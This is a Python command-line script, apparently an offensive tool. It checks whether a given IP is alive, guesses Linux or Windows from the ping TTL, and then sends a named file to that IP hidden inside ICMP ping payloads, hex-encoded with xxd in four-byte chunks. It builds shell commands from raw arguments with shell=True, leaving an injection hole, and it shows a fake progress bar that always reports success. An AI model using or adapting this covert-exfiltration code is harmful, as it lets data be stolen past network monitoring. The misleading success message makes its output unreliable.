#!/usr/bin/env python3
import subprocess
import sys
import time
import signal
import re
from colorama import Fore
from tqdm import tqdm


def ctrl_c(signum, frame):
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
          f"{Fore.BLUE + '  Exiting the program...'}")
    time.sleep(1)
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Colours
def get_colours(text, color):
    if color == "green":
        green_color = Fore.GREEN + text
        print(green_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)


def send_file(ip_address, file_name):
    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; done >/dev/null 2>&1"""
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
          f"{Fore.BLUE + '  Trying to send file..'}")
    check_output = subprocess.run([file_load], shell=True, capture_output=True, text=True)
    if 'No such file or directory' in str(check_output):
        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
              f"{Fore.RED + ' Indicate file not found, check file name.'}")
        print(Fore.WHITE) # To avoid leaving the terminal with colours.
    else:
        get_file_length = 0
        with open(f"{sys.argv[2]}", "r") as f:
            get_file_length = len(f.readlines())
        progess_bar = 0
        print()
        for i in tqdm(range(get_file_length * 10000)):
            progess_bar += i
        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
              f"{Fore.BLUE + '  File sent successfully'}")
        print(Fore.WHITE)


if len(sys.argv) != 3:
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
          f"{Fore.YELLOW + f' Usage {sys.argv[0]} <IP-Address> <File-Name to send over the network>'}")
else:
    scan_host = subprocess.run([f"timeout 1 ping -c 1 {sys.argv[1]}"], stdout=subprocess.PIPE, shell=True)
    split_ttl = str(scan_host).split()
    try:
        get_ttl_size = split_ttl[18]
        ttl_value = re.findall(r"\d{1,3}", get_ttl_size)[0]
        if "returncode=0" in str(scan_host):
            if int(ttl_value) >= 0 and int(ttl_value) <= 64:
                print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                      f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Linux system'}")
            elif int(ttl_value) >= 65 and int(ttl_value) <= 128:
                print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                      f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Windows system'}")
        send_file(sys.argv[1], sys.argv[2])
    except IndexError:
        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
              f"{Fore.RED + ' Host is not active.'}")
